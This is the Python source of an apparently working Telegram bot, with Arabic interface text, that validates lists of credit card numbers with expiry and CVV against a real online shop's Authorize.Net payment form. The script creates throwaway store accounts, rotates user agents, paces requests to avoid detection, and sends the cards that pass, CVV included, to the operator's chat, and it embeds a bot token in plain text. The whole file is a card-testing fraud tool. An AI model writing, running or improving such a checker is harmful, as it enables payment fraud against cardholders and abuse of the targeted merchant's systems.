from flask import Flask
from threading import Thread
import os
import requests
import re
import time
import random
import threading
import uuid
import shutil
from pathlib import Path
from colorama import Fore, Style, init
from queue import Queue
import fake_useragent
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ==================== تهيئة Flask ====================
app = Flask('')

@app.route('/')
def home():
    return "✅ البوت شغال الحمدلله!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask server started")

# ==================== تهيئة الألوان ====================
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFVj27YqwLI_na3YksvMcApJOopObTaIII"
TEMP_DIR = "temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)

# متغيرات عامة
current_chat_id = None
current_bot = None
stop_checking = False
checking_active = False
checking_thread = None

# متغيرات الإحصائيات
stats = {
    'total': 0,
    'checked': 0,
    'approved': 0,
    'declined': 0,
    'errors': 0,
    'start_time': 0
}

# ==================== الكود الأصلي للأداة ====================

BASE_URL = "https://morgannasalchemy.com"
LOGIN_URL = f"{BASE_URL}/my-account/"
ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"

file_lock = threading.Lock()

def print_banner():
    print(Fore.RED + Style.BRIGHT + """
  =======================================================
  |                                                     |
  |           SCRIPT BY Obeida Trading                |
  |                                                     |
  =======================================================
""")

def generate_random_data():
    unique_id = str(uuid.uuid4())[:8]
    email = f"fuck_{unique_id}@example.com"
    password = f"Pass_{unique_id}!23"
    return email, password

class AuthorizeNetChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.user_agent = fake_useragent.UserAgent().random
        self.session.headers.update({"User-Agent": self.user_agent})
        self.current_email = None
        self.current_password = None

    def register(self):
        try:
            self.current_email, self.current_password = generate_random_data()
            print(f"{Fore.YELLOW}[*] تسجيل حساب جديد: {self.current_email}...")
            
            resp = self.session.get(LOGIN_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return False, "Could not find registration nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "email": self.current_email,
                "password": self.current_password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            resp = self.session.post(LOGIN_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Logout" in resp.text or "Dashboard" in resp.text or "My Account" in resp.text:
                print(f"{Fore.GREEN}✅ تم تسجيل الحساب بنجاح: {self.current_email}")
                return True, None
            else:
                return False, "Registration failed"
        except Exception as e:
            return False, str(e)

    def check_card(self, cc_line):
        try:
            if "|" not in cc_line:
                return "ERROR", "Invalid CC format"
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            exp_formatted = f"{mm} / {yy[-2:]}"
            
            resp = self.session.get(ADD_PAYMENT_URL, proxies=self.proxy, timeout=20)
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
            
            if not nonce_match:
                return "ERROR", "Could not find add-payment-method nonce"
            
            nonce = nonce_match.group(1)
            
            payload = {
                "payment_method": "yith_wcauthnet_credit_card_gateway",
                "yith_wcauthnet_credit_card_gateway-card-number": cc.replace(" ", "+"),
                "yith_wcauthnet_credit_card_gateway-card-expiry": exp_formatted,
                "yith_wcauthnet_credit_card_gateway-card-cvc": cvv,
                "yith_wcauthnet_credit_card_gateway-card-type": "",
                "woocommerce-add-payment-method-nonce": nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            
            resp = self.session.post(ADD_PAYMENT_URL, data=payload, proxies=self.proxy, timeout=30)
            
            if "Payment method successfully added" in resp.text:
                return "succeed", "Success"
            elif "declined" in resp.text.lower() or "error" in resp.text.lower():
                err_match = re.search(r'class="woocommerce-error" role="alert">(.*?)</ul>', resp.text, re.DOTALL)
                if err_match:
                    clean_err = re.sub('<[^<]+?>', '', err_match.group(1)).strip()
                    return "DECLINED", clean_err
                return "DECLINED", "Card Declined"
            else:
                return "DECLINED", "Unknown result"
                
        except Exception as e:
            return "ERROR", str(e)

# دالة لإرسال البطاقة الصالحة فوراً
async def send_approved_instant(cc_line, msg, email, chat_id, bot):
    try:
        # تصميم رسالة جميلة للبطاقة الصالحة
        cc_parts = cc_line.split('|')
        card_number = cc_parts[0][:4] + ' ' + cc_parts[0][4:8] + ' ' + cc_parts[0][8:12] + ' ' + cc_parts[0][12:16]
        
        message = f"""╔══════════════════════════╗
║     ✅ *بطاقة صالحة*     ║
╠══════════════════════════╣
║ 💳 *الرقم:* `{card_number}`
║ 📅 *التاريخ:* {cc_parts[1]}/{cc_parts[2]}
║ 🔐 *الرمز:* {cc_parts[3]}
╠══════════════════════════╣
║ 📧 *الحساب:* `{email}`
║ 💬 *الحالة:* {msg}
╚══════════════════════════╝

✨ تم العثور على بطاقة صالحة!"""

        await bot.send_message(
            chat_id=chat_id,
            text=message,
            parse_mode='Markdown'
        )
        print(f"{Fore.GREEN}[✓] تم إرسال البطاقة الصالحة فوراً: {cc_line}")
    except Exception as e:
        print(f"{Fore.RED}[✗] فشل إرسال البطاقة: {str(e)}")

# دالة إنشاء أزرار التحكم
def get_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("▶️ بدء الفحص", callback_data="start_scan"),
            InlineKeyboardButton("⏹️ إيقاف", callback_data="stop_scan")
        ],
        [
            InlineKeyboardButton("📊 الحالة", callback_data="show_status"),
            InlineKeyboardButton("📁 النتائج", callback_data="show_results")
        ],
        [
            InlineKeyboardButton("🧹 تنظيف", callback_data="cleanup"),
            InlineKeyboardButton("❓ مساعدة", callback_data="help")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# دالة إنشاء شريط التقدم
def create_progress_bar(percentage, width=15):
    filled = int(width * percentage / 100)
    bar = '▓' * filled + '░' * (width - filled)
    return f"`[{bar}]` {percentage:.1f}%"

# دالة عرض الإحصائيات
async def show_statistics(chat_id, bot):
    global stats
    
    if stats['total'] == 0:
        await bot.send_message(
            chat_id=chat_id,
            text="📊 لا توجد إحصائيات حالياً",
            reply_markup=get_control_keyboard()
        )
        return
    
    checked = stats['checked']
    total = stats['total']
    percentage = (checked / total * 100) if total > 0 else 0
    progress_bar = create_progress_bar(percentage)
    
    # حساب الوقت المنقضي والمتبقي
    elapsed = time.time() - stats['start_time'] if stats['start_time'] > 0 else 0
    elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    
    if checked > 0 and elapsed > 0:
        speed = checked / elapsed
        remaining_cards = total - checked
        eta = remaining_cards / speed if speed > 0 else 0
        eta_str = time.strftime("%H:%M:%S", time.gmtime(eta))
    else:
        eta_str = "--:--:--"
    
    status_text = "🟢 **نشط**" if checking_active else "🔴 **متوقف**"
    
    message = f"""╔══════════════════════════╗
║     📊 *الإحصائيات*      ║
╠══════════════════════════╣
║ {status_text}
╠══════════════════════════╣
║ 📈 *التقدم:* {progress_bar}
║ 📁 تم فحص: `{checked}/{total}`
╠══════════════════════════╣
║ ✅ الناجحة: `{stats['approved']}`
║ ❌ المرفوضة: `{stats['declined']}`
║ ⚠️ الأخطاء: `{stats['errors']}`
╠══════════════════════════╣
║ ⏱️ الوقت: `{elapsed_str}`
║ ⏳ المتبقي: `{eta_str}`
╚══════════════════════════╝"""

    await bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

def worker_single_file(chat_id, bot):
    """وظيفة المعالجة من ملف abood.txt"""
    global current_chat_id, current_bot, stop_checking, checking_active, stats
    
    current_chat_id = chat_id
    current_bot = bot
    stop_checking = False
    checking_active = True
    
    # إعادة تعيين الإحصائيات
    stats = {
        'total': 0,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'start_time': time.time()
    }
    
    try:
        # قراءة الملف
        with open("abood.txt", "r", encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lines:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt فارغ!"),
                asyncio.get_event_loop()
            )
            checking_active = False
            return False
        
        stats['total'] = len(lines)
        print(f"{Fore.CYAN}تم العثور على {len(lines)} بطاقة في ملف abood.txt")
        
        # إرسال رسالة بدء الفحص
        asyncio.run_coroutine_threadsafe(
            bot.send_message(
                chat_id=chat_id,
                text=f"🔍 *بدأ الفحص...*\nعدد البطاقات: {len(lines)}\n✅ سيتم إرسال البطاقات الصالحة فور ظهورها",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            ),
            asyncio.get_event_loop()
        )
        
        # تحديد عدد البطاقات لكل حساب (5 بطاقات)
        cards_per_account = 5
        num_accounts = (len(lines) + cards_per_account - 1) // cards_per_account
        
        print(f"{Fore.YELLOW}سيتم استخدام {num_accounts} حساب (كل حساب {cards_per_account} بطاقات)")
        
        for account_num in range(num_accounts):
            # التحقق من طلب الإيقاف
            if stop_checking:
                print(f"{Fore.YELLOW}⏹️ تم إيقاف الفحص بناءً على طلب المستخدم")
                asyncio.run_coroutine_threadsafe(
                    bot.send_message(
                        chat_id=chat_id,
                        text="⏹️ *تم إيقاف الفحص*\n📁 تم حفظ النتائج حتى الآن",
                        parse_mode='Markdown',
                        reply_markup=get_control_keyboard()
                    ),
                    asyncio.get_event_loop()
                )
                break
            
            start_idx = account_num * cards_per_account
            end_idx = min(start_idx + cards_per_account, len(lines))
            account_cards = lines[start_idx:end_idx]
            
            print(f"\n{Fore.MAGENTA}{'='*60}")
            print(f"{Fore.YELLOW}🔄 إنشاء حساب رقم {account_num + 1}/{num_accounts}")
            
            # إنشاء حساب جديد
            checker = AuthorizeNetChecker()
            success, err = checker.register()
            
            if not success:
                print(f"{Fore.RED}❌ فشل تسجيل الحساب {account_num + 1}: {err}")
                # حفظ البطاقات في error
                for cc_line in account_cards:
                    stats['errors'] += 1
                    stats['checked'] += 1
                    with file_lock:
                        with open("error.txt", "a", encoding="utf-8") as f:
                            f.write(f"{cc_line} - فشل إنشاء الحساب\n")
                continue
            
            print(f"{Fore.CYAN}📌 الحساب {checker.current_email} يفحص {len(account_cards)} بطاقات")
            
            for i, cc_line in enumerate(account_cards, 1):
                # التحقق من طلب الإيقاف
                if stop_checking:
                    break
                
                start_time = time.time()
                print(f"\n{Fore.WHITE}[الحساب {account_num + 1} - بطاقة {i}/{len(account_cards)}] جاري فحص: {cc_line}")
                
                status, msg = checker.check_card(cc_line)
                elapsed_time = time.time() - start_time
                
                # تحديث الإحصائيات
                stats['checked'] += 1
                
                with file_lock:
                    if status == "succeed":
                        print(f"{Fore.GREEN}[✅ APPROVED] {cc_line} - {msg}")
                        with open("APPROVED.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['approved'] += 1
                        
                        # إرسال البطاقة الصالحة فوراً
                        asyncio.run_coroutine_threadsafe(
                            send_approved_instant(cc_line, msg, checker.current_email, chat_id, bot),
                            asyncio.get_event_loop()
                        )
                        
                    elif status == "DECLINED":
                        print(f"{Fore.RED}[❌ DECLINED] {cc_line} - {msg}")
                        with open("declined.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['declined'] += 1
                    else:
                        print(f"{Fore.WHITE}[⚠️ ERROR] {cc_line} - {msg}")
                        with open("error.txt", "a", encoding="utf-8") as f: 
                            f.write(f"{cc_line} - {msg} - الحساب: {checker.current_email}\n")
                        stats['errors'] += 1
                
                # إرسال تحديث الإحصائيات كل 5 بطاقات
                if stats['checked'] % 5 == 0:
                    asyncio.run_coroutine_threadsafe(
                        show_statistics(chat_id, bot),
                        asyncio.get_event_loop()
                    )
                
                # انتظار 20 ثانية قبل البطاقة التالية
                if i < len(account_cards) and not stop_checking:
                    wait_time = 20
                    remaining_wait = max(0, wait_time - elapsed_time)
                    
                    if remaining_wait > 0:
                        print(f"{Fore.BLUE}⏳ انتظار {remaining_wait:.1f} ثانية...")
                        # انتظار مع التحقق من الإيقاف
                        for _ in range(int(remaining_wait)):
                            if stop_checking:
                                break
                            time.sleep(1)
            
            # حفظ معلومات الحساب
            with file_lock:
                with open("accounts_summary.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n=== الحساب {account_num + 1}: {checker.current_email} | الباسورد: {checker.current_password} | تم فحص {len(account_cards)} بطاقات ===\n")
                    f.write("="*50 + "\n")
            
            print(f"{Fore.GREEN}✅ الحساب {account_num + 1} اكتمل.")
            
            # انتظار 10 ثواني قبل الحساب الجديد
            if account_num < num_accounts - 1 and not stop_checking:
                print(f"{Fore.YELLOW}⏱️ انتظار 10 ثواني قبل الحساب التالي...")
                for _ in range(10):
                    if stop_checking:
                        break
                    time.sleep(1)
        
        # إرسال النتائج النهائية
        if not stop_checking:
            asyncio.run_coroutine_threadsafe(
                show_statistics(chat_id, bot),
                asyncio.get_event_loop()
            )
            
            # إرسال ملف APPROVED.txt
            if os.path.exists("APPROVED.txt") and os.path.getsize("APPROVED.txt") > 0:
                with open("APPROVED.txt", "rb") as f:
                    asyncio.run_coroutine_threadsafe(
                        bot.send_document(
                            chat_id=chat_id, 
                            document=f, 
                            filename="APPROVED.txt",
                            caption="✅ البطاقات الصالحة",
                            reply_markup=get_control_keyboard()
                        ),
                        asyncio.get_event_loop()
                    )
            
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}🎉 تم الانتهاء من فحص جميع البطاقات!")
        
        checking_active = False
        return True
        
    except FileNotFoundError:
        print(f"{Fore.RED}ملف abood.txt مش موجود!")
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!", reply_markup=get_control_keyboard()),
            asyncio.get_event_loop()
        )
        checking_active = False
        return False
    except Exception as e:
        print(f"{Fore.RED}حصل خطأ: {str(e)}")
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=f"❌ حدث خطأ: {str(e)[:200]}", reply_markup=get_control_keyboard()),
            asyncio.get_event_loop()
        )
        checking_active = False
        return False

# ==================== دوال البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب مع أزرار"""
    welcome_msg = """╔══════════════════════════╗
║     🤖 *مرحباً بك في*    ║
║    *بوت فحص البطاقات*    ║
╠══════════════════════════╣
║ 📁 أرسل لي ملف `abood.txt` ║
║    لبدء الفحص            ║
╠══════════════════════════╣
║ ✨ *مميزات البوت:*       ║
║ • إرسال فوري للصالحة     ║
║ • إحصائيات مباشرة        ║
║ • أزرار تحكم كاملة       ║
║ • إيقاف الفحص بأمان      ║
╚══════════════════════════╝

📝 *صيغة الملف المطلوبة:*
`4111111111111111|12|2025|123`"""
    
    await update.message.reply_text(
        welcome_msg, 
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الضغط على الأزرار"""
    query = update.callback_query
    await query.answer()
    
    global checking_active, stop_checking, checking_thread, stats
    
    if query.data == "start_scan":
        if checking_active:
            await query.edit_message_text(
                text="⚠️ *الفحص قيد التشغيل بالفعل*\nاستخدم زر الإيقاف إذا أردت إيقافه",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
        else:
            if not os.path.exists("abood.txt"):
                await query.edit_message_text(
                    text="❌ *ملف abood.txt غير موجود*\nالرجاء إرسال الملف أولاً",
                    parse_mode='Markdown',
                    reply_markup=get_control_keyboard()
                )
            else:
                await query.edit_message_text(
                    text="🔄 *جاري بدء الفحص...*",
                    parse_mode='Markdown'
                )
                # بدء الفحص في ثريد منفصل
                checking_thread = threading.Thread(
                    target=worker_single_file,
                    args=(query.message.chat_id, context.bot)
                )
                checking_thread.start()
    
    elif query.data == "stop_scan":
        if checking_active:
            # إظهار تأكيد الإيقاف
            keyboard = [
                [
                    InlineKeyboardButton("✅ نعم، أوقف", callback_data="confirm_stop"),
                    InlineKeyboardButton("❌ لا، استمر", callback_data="cancel_stop")
                ]
            ]
            await query.edit_message_text(
                text="⚠️ *هل أنت متأكد من إيقاف الفحص؟*\nسيتم حفظ النتائج حتى الآن",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text(
                text="⏸️ *لا يوجد فحص قيد التشغيل*",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "confirm_stop":
        global stop_checking
        stop_checking = True
        await query.edit_message_text(
            text="⏹️ *جاري إيقاف الفحص...*\nالرجاء الانتظار قليلاً",
            parse_mode='Markdown'
        )
    
    elif query.data == "cancel_stop":
        await query.edit_message_text(
            text="✅ *تم إلغاء الإيقاف*\nالفحص مستمر",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "show_status":
        await show_statistics(query.message.chat_id, context.bot)
        await query.delete()
    
    elif query.data == "show_results":
        keyboard = [
            [
                InlineKeyboardButton("✅ APPROVED", callback_data="get_approved"),
                InlineKeyboardButton("❌ DECLINED", callback_data="get_declined")
            ],
            [
                InlineKeyboardButton("⚠️ ERRORS", callback_data="get_errors"),
                InlineKeyboardButton("📁 ACCOUNTS", callback_data="get_accounts")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")
            ]
        ]
        await query.edit_message_text(
            text="📁 *اختر ملف النتائج الذي تريد تحميله:*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "get_approved":
        if os.path.exists("APPROVED.txt") and os.path.getsize("APPROVED.txt") > 0:
            with open("APPROVED.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="APPROVED.txt",
                    caption="✅ البطاقات الصالحة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات صالحة بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_declined":
        if os.path.exists("declined.txt") and os.path.getsize("declined.txt") > 0:
            with open("declined.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="declined.txt",
                    caption="❌ البطاقات المرفوضة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات مرفوضة بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_errors":
        if os.path.exists("error.txt") and os.path.getsize("error.txt") > 0:
            with open("error.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="error.txt",
                    caption="⚠️ الأخطاء"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد أخطاء بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_accounts":
        if os.path.exists("accounts_summary.txt") and os.path.getsize("accounts_summary.txt") > 0:
            with open("accounts_summary.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="accounts_summary.txt",
                    caption="📁 ملخص الحسابات المستخدمة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد حسابات بعد",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "cleanup":
        # تنظيف الملفات
        files_to_delete = ["APPROVED.txt", "declined.txt", "error.txt", "accounts_summary.txt", "abood.txt"]
        deleted = []
        
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
                deleted.append(file)
        
        # إعادة تعيين الإحصائيات
        stats = {
            'total': 0,
            'checked': 0,
            'approved': 0,
            'declined': 0,
            'errors': 0,
            'start_time': 0
        }
        
        await query.edit_message_text(
            text=f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "help":
        help_text = """╔══════════════════════════╗
║     📚 *المساعدة*       ║
╠══════════════════════════╣
║ *الأزرار المتاحة:*      ║
║ ▶️ بدء الفحص - ابدأ الفحص║
║ ⏹️ إيقاف - أوقف الفحص    ║
║ 📊 الحالة - عرض الإحصائيات║
║ 📁 النتائج - تحميل الملفات║
║ 🧹 تنظيف - حذف الملفات   ║
╠══════════════════════════╣
║ *كيفية الاستخدام:*      ║
║ 1️⃣ أرسل ملف abood.txt   ║
║ 2️⃣ اضغط بدء الفحص       ║
║ 3️⃣ انتظر النتائج        ║
╚══════════════════════════╝"""
        
        await query.edit_message_text(
            text=help_text,
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "back_to_menu":
        await query.edit_message_text(
            text="🔍 *القائمة الرئيسية*\nاختر ما تريد فعله:",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """استقبال الملف"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # إرسال رسالة تأكيد
    await update.message.reply_text("📥 جاري استلام الملف...")
    
    try:
        # تحميل الملف
        file = await update.message.document.get_file()
        
        # التحقق من اسم الملف
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text(
                "❌ الملف يجب أن يكون بصيغة .txt",
                reply_markup=get_control_keyboard()
            )
            return
        
        if update.message.document.file_name.lower() != "abood.txt":
            await update.message.reply_text(
                "❌ اسم الملف يجب أن يكون `abood.txt` بالضبط",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
            return
        
        # حفظ الملف
        temp_file_path = os.path.join(TEMP_DIR, f"abood_{user_id}_{int(time.time())}.txt")
        await file.download_to_drive(temp_file_path)
        
        # نسخ الملف
        shutil.copy2(temp_file_path, "abood.txt")
        
        # قراءة عدد البطاقات
        with open("abood.txt", "r", encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        await update.message.reply_text(
            f"✅ *تم استلام الملف بنجاح!*\n📁 عدد البطاقات: {len(lines)}\n\nاضغط ▶️ *بدء الفحص* للبدء",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ حدث خطأ: {str(e)[:200]}",
            reply_markup=get_control_keyboard()
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض الحالة"""
    await show_statistics(update.effective_chat.id, context.bot)

async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر التنظيف"""
    files_to_delete = ["APPROVED.txt", "declined.txt", "error.txt", "accounts_summary.txt", "abood.txt"]
    deleted = []
    
    for file in files_to_delete:
        if os.path.exists(file):
            os.remove(file)
            deleted.append(file)
    
    # تنظيف الملفات المؤقتة
    for temp_file in Path(TEMP_DIR).glob("*.txt"):
        temp_file.unlink()
        deleted.append(str(temp_file))
    
    # إعادة تعيين الإحصائيات
    global stats
    stats = {
        'total': 0,
        'checked': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0,
        'start_time': 0
    }
    
    await update.message.reply_text(
        f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    help_text = """╔══════════════════════════╗
║     📚 *المساعدة*       ║
╠══════════════════════════╣
║ *الأزرار المتاحة:*      ║
║ ▶️ بدء الفحص - ابدأ الفحص║
║ ⏹️ إيقاف - أوقف الفحص    ║
║ 📊 الحالة - عرض الإحصائيات║
║ 📁 النتائج - تحميل الملفات║
║ 🧹 تنظيف - حذف الملفات   ║
╠══════════════════════════╣
║ *الأوامر النصية:*       ║
║ /start - القائمة الرئيسية║
║ /status - عرض الحالة    ║
║ /cleanup - تنظيف الملفات║
║ /help - عرض المساعدة    ║
╚══════════════════════════╝"""
    
    await update.message.reply_text(
        help_text,
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

def main():
    """تشغيل البوت"""
    # تشغيل Flask server
    keep_alive()
    
    # إنشاء مجلد temp_files
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("cleanup", cleanup_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # تشغيل البوت
    print("🤖 البوت يعمل...")
    print("✨ ميزة الإرسال الفوري مفعلة")
    print("🎯 واجهة الأزرار جاهزة")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    import asyncio
    main()
